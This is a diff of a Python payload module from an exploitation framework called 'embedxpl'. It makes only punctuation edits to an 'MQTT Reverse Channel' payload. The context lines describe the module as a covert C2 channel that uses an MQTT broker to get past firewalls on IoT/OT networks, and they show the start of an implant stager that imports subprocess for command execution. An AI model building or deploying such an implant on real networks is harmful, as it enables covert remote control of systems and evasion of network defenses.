@@ -1,7 +1,7 @@
 """MQTT Covert Channel Payload.
 
 Usa um broker MQTT como canal de C2 bidirecional.
-Bypassa firewalls que só bloqueiam TCP direto — MQTT (porta 1883/8883) é
+Bypassa firewalls que só bloqueiam TCP direto  -  MQTT (porta 1883/8883) é
 comumente permitido em redes IoT/OT.
 
 Protocolo:
@@ -15,7 +15,7 @@ from embedxpl.core.exploit.payloads import BasePayload
 class Payload(BasePayload):
     __info__ = {
         "name": "MQTT Reverse Channel",
-        "description": "MQTT broker as covert C2 channel — bidirectional command execution.",
+        "description": "MQTT broker as covert C2 channel  -  bidirectional command execution.",
         "authors": ("André Henrique (@mrhenrike)", "União Geek"),
     }
 
@@ -36,7 +36,7 @@ class Payload(BasePayload):
         tls     = self.options["TLS"]["value"].lower() == "true"
 
         stager = f"""#!/usr/bin/env python3
-# MQTT C2 implant — session: {session}
+# MQTT C2 implant  -  session: {session}
 import subprocess,os,sys
 try:import paho.mqtt.client as mqtt
 except ImportError:
